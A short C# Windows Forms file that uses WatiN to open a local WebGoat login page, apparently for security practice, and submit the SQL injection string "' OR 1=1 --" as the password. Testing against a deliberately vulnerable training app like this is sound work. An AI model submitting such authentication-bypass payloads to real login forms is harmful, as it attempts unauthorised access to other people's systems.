using System;
using System.Threading;
using WatiN.Core;

namespace ParseHTMLWB
{
    public partial class Form1 : System.Windows.Forms.Form
    {   
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (var browser = new IE("http://localhost:8080/WebGoat/login.mvc"))
            {
                string beforeRequest = browser.Html;
                browser.TextField(Find.By("type", "text")).Value ="a";
                var passwordField = browser.TextField(Find.By("type", "password"));
                passwordField.Value = "' OR 1=1 --";
                WatiN.Core.Form frm = (WatiN.Core.Form)passwordField.Ancestor("form");
                frm.Submit();               
            }
        }

        internal static bool WaitForAsyncPostbackComplete(IE browser, int timeout)
        {
            int timeWaitedInMilliseconds = 0;
            var maxWaitTimeInMilliseconds = Settings.WaitForCompleteTimeOut * 1000;
            var scriptToCheck =
            "Sys.WebForms.PageRequestManager.getInstance().get_isInAsyncPostBack();";

            while (bool.Parse(browser.Eval(scriptToCheck)) == true
                    && timeWaitedInMilliseconds < maxWaitTimeInMilliseconds)
            {
                Thread.Sleep(Settings.SleepTime);
                timeWaitedInMilliseconds += Settings.SleepTime;
            }

            return bool.Parse(browser.Eval(scriptToCheck));
        }
    }
}
